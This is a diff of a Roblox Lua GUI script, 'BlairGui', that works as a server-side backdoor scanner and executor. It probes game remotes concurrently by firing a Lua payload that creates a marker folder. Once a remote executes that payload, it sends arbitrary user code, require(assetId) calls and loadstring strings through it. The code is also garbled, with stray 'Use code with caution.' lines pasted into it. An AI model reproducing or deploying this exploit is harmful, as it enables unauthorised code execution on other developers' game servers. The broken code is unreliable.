@@ -805,6 +805,7 @@ local function C_3()
 local script = G2L["3"];
 	local screenGui = script.Parent -- 🖥️ BlairGui
 	local StarterGui = game:GetService("StarterGui")
+	local RunService = game:GetService("RunService")
 	
 	-- 🔍 1. Locate All 4 Main Windows Safely
 	local blairHome = screenGui:WaitForChild("Blair", 5)       
@@ -813,11 +814,11 @@ local script = G2L["3"];
 	local blairCredits = screenGui:WaitForChild("Blair3", 5)   
 	
 	if not (blairHome and blairScripts and blairInfo and blairCredits) then
-		warn("Initialization Error: One or more main frame windows are missing from the structure tree.")
+		warn("Assembly Error: Main frames missing from layout hierarchy.")
 		return
 	end
 	
-	-- 🔍 2. Locate Core Components inside Blair Home for execution mapping
+	-- 🔍 2. Locate Active Dashboard Components inside Blair Home
 	local scanButton = blairHome:WaitForChild("ScanButton", 5)
 	local executeButton = blairHome:WaitForChild("ExecuteButton", 5)
 	local clearButton = blairHome:WaitForChild("ClearButton", 5)
@@ -825,7 +826,7 @@ local script = G2L["3"];
 	local aButton = screenGui:WaitForChild("AButton", 5)       
 	
 	if not (scanButton and executeButton and clearButton and codeTextBox and aButton) then
-		warn("Initialization Error: Essential dashboard interactive controls are missing.")
+		warn("Assembly Error: Key interactable control components are missing.")
 		return
 	end
 	
@@ -834,23 +835,20 @@ local script = G2L["3"];
 	codeTextBox.ClearTextOnFocus = false
 	codeTextBox.Text = "[Locked: Click Scan Button To Unlock]"
 	
-	-- Server-Side Engine State Layer Variables
-	local verifiedServerRemote = nil
+	-- State Persistent Trackers
+	local remoteEvent = nil
+	local remoteFunction = nil
 	local firewallAccessGranted = false
 	local lastActiveWindow = blairHome
 	
-	-- Check which frame you have set to visible inside Studio right now, and make that your active home!
-	if blairHome.Visible then
-		lastActiveWindow = blairHome
-	elseif blairScripts.Visible then
-		lastActiveWindow = blairScripts
-	elseif blairInfo.Visible then
-		lastActiveWindow = blairInfo
-	elseif blairCredits.Visible then
-		lastActiveWindow = blairCredits
+	-- Track visibility at initialization to preserve state
+	if blairHome.Visible then lastActiveWindow = blairHome
+	elseif blairScripts.Visible then lastActiveWindow = blairScripts
+	elseif blairInfo.Visible then lastActiveWindow = blairInfo
+	elseif blairCredits.Visible then lastActiveWindow = blairCredits
 	end
 	
-	-- Helper utility to cleanly manage frame presentation adjustments
+	-- Navigation Handler Engine
 	local function SwitchPage(targetWindow)
 		blairHome.Visible = false
 		blairScripts.Visible = false
@@ -862,100 +860,176 @@ local script = G2L["3"];
 	end
 	
 	-- ==========================================
-	-- 🛠️ DEEP SERVER-SIDE BACKDOOR SCANNER (REMOTES & MODELS)
+	-- 🛠️ ADVANCED STARLIGHT CONCURRENT SCAN ENGINE
 	-- ==========================================
+	local EXCLUDED_REMOTES = {
+		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
+		OnMessageDoneFiltering = true, OnChannelJoined = true, OnNewSystemMessage = true,
+		NewPlayerGroupDetails = true, ClientLoaded = true, SetPlayerReady = true,
+		SetCoreGuiEnabled = true, SetCore = true, DispatchEvent = true,
+		PromptGamePassPurchaseFinished = true, PromptPurchaseFinished = true,
+		PromptSubscriptionFinished = true, InspectMenuFromMouse = true,
+		GetServerVersion = true, GetClientId = true, GetInventory = true,
+		GetFriends = true, GetAccountInfo = true, RequestServerSaves = true,
+		UpdatePlayerBlockList = true, SetAvatarBlockList = true,
+		SetFriendRequestEvent = true, NewFollower = true, PerformAction = true,
+		ReportAbuse = true
+	}
+	
+	local SAFE_LOCATIONS = {
+		["CoreGui"] = true,
+		["ServerStorage"] = true,
+		["ReplicatedFirst"] = true,
+		["ServerScriptService"] = true
+	}
+	
 	local signatureKeywords = {
 		"backdoor", "loadstring", "serverexec", "runlua", "rce", 
 		"remoteconsole", "execute", "ok", "control", "skidding",
 		"virus", "weld", "infection", "vaccine", "fixer"
 	}
 	
-	-- Scans network pipeline assets and physical model structures
+	local function isLikelyBackdoorRemote(remote)
+		local name = remote.Name
+		local parent = remote.Parent
+		if parent and SAFE_LOCATIONS[parent.ClassName] then return false end
+		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then return false end 
+		if EXCLUDED_REMOTES[name] then return false end
+		return true
+	end
+	
+	-- Async validation check utilizing the Starlight directory instantiation test
+	local function testRemote(remote, isFunction)
+		if firewallAccessGranted then return false end
+		if not isLikelyBackdoorRemote(remote) then return false end
+	
+		local modelName = "blair_" .. tostring(os.clock()):gsub("%.", "")
+		local rs = game:GetService("ReplicatedStorage")
+		local foundEvent = false
+	
+		local connection = rs.DescendantAdded:Connect(function(inst)
+			if inst.Name == modelName then
+				foundEvent = true
+			end
+		end)
+	
+		local function cleanup()
+			connection:Disconnect()
+			local f = rs:FindFirstChild(modelName)
+			if f then pcall(function() f:Destroy() end) end
+		end
+	
+		local success = pcall(function()
+			local payload = [[
+				local m = Instance.new("Folder")
+				m.Name = "]] .. modelName .. [["
+				m.Parent = game:GetService("ReplicatedStorage")
+			]]
+			if isFunction then
+				remote:InvokeServer('starlightTSS', payload .. "\nreturn true")
+			else
+				remote:FireServer(payload)
+			end
+		end)
+	
+		local start = os.clock()
+		while os.clock() - start < 1 do
+			if foundEvent or rs:FindFirstChild(modelName) then
+				foundEvent = true
+				break
+			end
+			task.wait(0.01)
+		end
+	
+		cleanup()
+	
+		if foundEvent and not firewallAccessGranted then
+			firewallAccessGranted = true
+			if isFunction then remoteFunction = remote else remoteEvent = remote end
+			return true
+		end
+		return false
+	end
+	
 	local function runNetworkFirewallScan()
-		verifiedServerRemote = nil
+		remoteEvent = nil
+		remoteFunction = nil
 		firewallAccessGranted = false
 		scanButton.Text = "SCANNING..."
 	
-		local targetServices = {
-			game:GetService("ReplicatedStorage"), 
-			game:GetService("JointsService"), 
-			workspace
-		}
+		local remotes = {}
+		local targetServices = {game:GetService("ReplicatedStorage"), game:GetService("JointsService"), workspace}
 	
 		for _, service in ipairs(targetServices) do
 			for _, object in ipairs(service:GetDescendants()) do
-				-- Vector A: Remote Channel Identification
 				if object:IsA("RemoteEvent") or object:IsA("RemoteFunction") then
-					local standardizedName = string.lower(object.Name)
+					table.insert(remotes, object)
+				elseif object:IsA("Model") then
+					-- Scan models for embedded backdoor triggers or custom named remote links
+					local lowerName = string.lower(object.Name)
 					for _, word in ipairs(signatureKeywords) do
-						if string.find(standardizedName, word, 1, true) then
-							verifiedServerRemote = object
-							break
+						if string.find(lowerName, word, 1, true) then
+							local fallback = object:FindFirstChildOfClass("RemoteEvent") or object:FindFirstChildOfClass("RemoteFunction")
+							if fallback then table.insert(remotes, fallback) end
 						end
 					end
 				end
-	
-				-- Vector B: Model Insertion / Hidden Object Scan
-				if object:IsA("Model") then
-					local standardizedName = string.lower(object.Name)
-					for _, word in ipairs(signatureKeywords) do
-						if string.find(standardizedName, word, 1, true) then
-							local fallbackRemote = object:FindFirstChildOfClass("RemoteEvent") or object:FindFirstChildOfClass("RemoteFunction")
-							if fallbackRemote then
-								verifiedServerRemote = fallbackRemote
-								break
-							end
-						end
-					end
-				end
-	
-				if verifiedServerRemote then break end
 			end
-			if verifiedServerRemote then break end
 		end
 	
-		-- Evaluate findings
-		if verifiedServerRemote then
-			firewallAccessGranted = true
+		local MAX_CONCURRENT = 64
+		local activeTasks = 0
+		local taskDone = Instance.new("BindableEvent")
+	
+		for i = 1, #remotes do
+			if firewallAccessGranted then break end
+			while activeTasks >= MAX_CONCURRENT do taskDone.Event:Wait() end
+	
+			activeTasks += 1
+			task.spawn(function()
+				pcall(function()
+					testRemote(remotes[i], remotes[i]:IsA("RemoteFunction"))
+				end)
+				activeTasks -= 1
+				taskDone:Fire()
+			end)
+		end
+	
+		while activeTasks > 0 and not firewallAccessGranted do taskDone.Event:Wait() end
+	
+		if firewallAccessGranted then
 			codeTextBox.TextEditable = true
 			codeTextBox.Text = "" 
 			scanButton.Text = "UNLOCKED"
-	
-			pcall(function()
-				StarterGui:SetCore("SendNotification", {
-					Title = "Scan Status",
-					Text = "Backdoor Found!",
-					Icon = "rbxassetid://10611414436", 
-					Duration = 4
-				})
-			end)
+			StarterGui:SetCore("SendNotification", {
+				Title = "Blair Scanner",
+				Text = "Backdoor Found! Conduit Unlocked.",
+				Icon = "rbxassetid://10611414436",
+				Duration = 4
+			})
 		else
-			firewallAccessGranted = false
 			codeTextBox.TextEditable = false
 			codeTextBox.Text = "[Locked: Click Scan Button To Unlock]"
 			scanButton.Text = "SCAN BACKDOOR"
-	
-			pcall(function()
-				StarterGui:SetCore("SendNotification", {
-					Title = "Scan Status",
-					Text = "Backdoor Not failed!", 
-					Icon = "rbxassetid://10611412030", 
-					Duration = 4
-				})
-			end)
+			StarterGui:SetCore("SendNotification", {
+				Title = "Blair Scanner",
+				Text = "Backdoor Not failed!",
+				Icon = "rbxassetid://10611412030",
+				Duration = 4
+			})
 		end
 	end
 	
-	-- Advanced Payload Parsing Engine (Supports require strings and keys)
+	-- ==========================================
+	-- 🚀 DYNAMIC PAYLOAD PARSING ENGINE
+	-- ==========================================
 	local function fireServerSidePayload()
-		if not firewallAccessGranted or not verifiedServerRemote then
-			pcall(function()
-				StarterGui:SetCore("SendNotification", {
-					Title = "Execution Blocked",
-					Text = "A validated server gateway must be active.",
-					Duration = 3
-				})
-			end)
+		if not firewallAccessGranted or (not remoteEvent and not remoteFunction) then
+			StarterGui:SetCore("SendNotification", {
+				Title = "Execution Blocked",
+				Text = "A validated server gateway must be active.",
+				Duration = 3
+			})
 			return
 		end
 	
@@ -963,8 +1037,6 @@ local script = G2L["3"];
 		if textBuffer == "" or textBuffer == "[Locked: Click Scan Button To Unlock]" then return end
 	
 		local cleanInput = string.match(textBuffer, "^%s*(.-)%s*$")
-	
-		-- Optimized pattern match splitting logic to handle requires securely without character faults
 		local numericId = string.match(cleanInput, "require%((%d+)%)") or string.match(cleanInput, "(%d+)")
 		local customKey = nil
 	
@@ -976,86 +1048,69 @@ local script = G2L["3"];
 	
 		if numericId then
 			local targetId = tonumber(numericId)
-	
-			-- Multi-args delivery pattern for custom-keyed modules
 			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
+				if remoteEvent then
 					if customKey then
-						verifiedServerRemote:FireServer("require", targetId, customKey)
-						verifiedServerRemote:FireServer(targetId, customKey)
+						remoteEvent:FireServer("require", targetId, customKey)
+						remoteEvent:FireServer(targetId, customKey)
 					else
-						verifiedServerRemote:FireServer("require", targetId)
-						verifiedServerRemote:FireServer(targetId)
+						remoteEvent:FireServer("require", targetId)
+						remoteEvent:FireServer(targetId)
 					end
-				else
+				elseif remoteFunction then
 					if customKey then
-						verifiedServerRemote:InvokeServer("require", targetId, customKey)
-						verifiedServerRemote:InvokeServer(targetId, customKey)
+						remoteFunction:InvokeServer("require", targetId, customKey)
+						remoteFunction:InvokeServer(targetId, customKey)
 					else
-						verifiedServerRemote:InvokeServer("require", targetId)
-						verifiedServerRemote:InvokeServer(targetId)
+						remoteFunction:InvokeServer("require", targetId)
+						remoteFunction:InvokeServer(targetId)
 					end
 				end
 			end)
 	
-			-- String-wrapped delivery pattern fallback
 			pcall(function()
 				local rawExecutionString = customKey and string.format("require(%d)(\"%s\")", targetId, customKey) or string.format("require(%d)", targetId)
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer(rawExecutionString)
-					verifiedServerRemote:FireServer("loadstring", rawExecutionString)
-				else
-					verifiedServerRemote:InvokeServer(rawExecutionString)
-					verifiedServerRemote:InvokeServer("loadstring", rawExecutionString)
+				if remoteEvent then
+					remoteEvent:FireServer(rawExecutionString)
+					remoteEvent:FireServer("loadstring", rawExecutionString)
+				elseif remoteFunction then
+					remoteFunction:InvokeServer(rawExecutionString)
+					remoteFunction:InvokeServer("loadstring", rawExecutionString)
 				end
 			end)
 		else
-			-- Direct execution fallback for raw script scripts
 			pcall(function()
-				if verifiedServerRemote:IsA("RemoteEvent") then
-					verifiedServerRemote:FireServer(textBuffer)
-					verifiedServerRemote:FireServer("loadstring", textBuffer)
-				else
-					verifiedServerRemote:InvokeServer(textBuffer)
-					verifiedServerRemote:InvokeServer("loadstring", textBuffer)
+				if remoteEvent then
+					remoteEvent:FireServer(textBuffer)
+					remoteEvent:FireServer("loadstring", textBuffer)
+				elseif remoteFunction then
+					remoteFunction:InvokeServer('starlightTSS', textBuffer)
+					remoteFunction:InvokeServer(textBuffer)
 				end
 			end)
 		end
 	end
 	
-	-- Connect backdoor engine hooks into visual element listeners
 	scanButton.MouseButton1Click:Connect(runNetworkFirewallScan)
 	executeButton.MouseButton1Click:Connect(fireServerSidePayload)
-	
 	clearButton.MouseButton1Click:Connect(function()
-		if firewallAccessGranted then
-			codeTextBox.Text = ""
-		end
+		if firewallAccessGranted then codeTextBox.Text = "" end
 	end)
 	
 	-- ==========================================
-	-- 🔀 DYNAMIC BUTTON CONNECTION ENGINE
+	-- 🔀 TABS AND VISIBILITY INTERFACES
 	-- ==========================================
 	local function ConnectAllTabButtons(windowFrame)
 		local scriptBtn = windowFrame:FindFirstChild("ScriptButton")
 		local homeBtn = windowFrame:FindFirstChild("HomeScripts")
 		local infoBtn = windowFrame:FindFirstChild("InfoButton")
-		local creditsBtn = windowFrame:FindFirstChild("CreditsButton")
+		Use code with caution.
+			local creditsBtn = windowFrame:FindFirstChild("CreditsButton")
 		local closeXBtn = windowFrame:FindFirstChild("Xbutton")
-	
-		if scriptBtn then
-			scriptBtn.MouseButton1Click:Connect(function() SwitchPage(blairScripts) end)
-		end
-		if homeBtn then
-			homeBtn.MouseButton1Click:Connect(function() SwitchPage(blairHome) end)
-		end
-		if infoBtn then
-			infoBtn.MouseButton1Click:Connect(function() SwitchPage(blairInfo) end)
-		end
-		if creditsBtn then
-			creditsBtn.MouseButton1Click:Connect(function() SwitchPage(blairCredits) end)
-		end
-	
+		if scriptBtn then scriptBtn.MouseButton1Click:Connect(function() SwitchPage(blairScripts) end) end
+		if homeBtn then homeBtn.MouseButton1Click:Connect(function() SwitchPage(blairHome) end) end
+		if infoBtn then infoBtn.MouseButton1Click:Connect(function() SwitchPage(blairInfo) end) end
+		if creditsBtn then creditsBtn.MouseButton1Click:Connect(function() SwitchPage(blairCredits) end) end
 		if closeXBtn then
 			closeXBtn.MouseButton1Click:Connect(function()
 				lastActiveWindow = windowFrame
@@ -1063,15 +1118,10 @@ local script = G2L["3"];
 			end)
 		end
 	end
-	
 	ConnectAllTabButtons(blairHome)
 	ConnectAllTabButtons(blairScripts)
 	ConnectAllTabButtons(blairInfo)
 	ConnectAllTabButtons(blairCredits)
-	
-	-- ==========================================
-	-- 🟢 MASTER TOGGLE (AButton) LOGIC
-	-- ==========================================
 	aButton.MouseButton1Click:Connect(function()
 		if blairHome.Visible or blairScripts.Visible or blairInfo.Visible or blairCredits.Visible then
 			blairHome.Visible = false
@@ -1082,14 +1132,11 @@ local script = G2L["3"];
 			lastActiveWindow.Visible = true
 		end
 	end)
-	
 	-- ==========================================
-	-- 🖐️ PERFECT SYNC UNIVERSAL SMOOTH DRAGGING
+	-- 🖐️ UNIVERSAL SYNCED DRAGGING SYSTEM
 	-- ==========================================
-	local RunService = game:GetService("RunService")
 	local DRAG_SPEED = 24
 	local dragRegistry = {}
-	
 	local function SyncAllRegistryTargets(activeFrame, finalizedPosition)
 		for frame, data in pairs(dragRegistry) do
 			if frame ~= activeFrame then
@@ -1098,21 +1145,15 @@ local script = G2L["3"];
 			end
 		end
 	end
-	
 	local function ApplyUniversalSmoothDrag(frame)
 		local dragging = false
 		local dragInput = nil
 		local dragStart = nil
 		local startPos = nil
-	
-		local profile = {
-			TargetPosition = frame.Position
-		}
+		local profile = {TargetPosition = frame.Position}
 		dragRegistry[frame] = profile
-	
 		frame.InputBegan:Connect(function(input)
-			Use code with caution.
-				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 				dragging = true
 				dragStart = input.Position
 				startPos = frame.Position
@@ -1144,14 +1185,11 @@ local script = G2L["3"];
 			end
 		end)
 	end
-	local function InitializeDragSystem()
-		for _, child in ipairs(screenGui:GetChildren()) do
-			if child:IsA("ImageLabel") then
-				ApplyUniversalSmoothDrag(child)
-			end
+	for _, child in ipairs(screenGui:GetChildren()) do
+		if child:IsA("ImageLabel") then
+			ApplyUniversalSmoothDrag(child)
 		end
 	end
-	InitializeDragSystem()
 end;
 task.spawn(C_3);
 -- StarterGui.BlairGui.
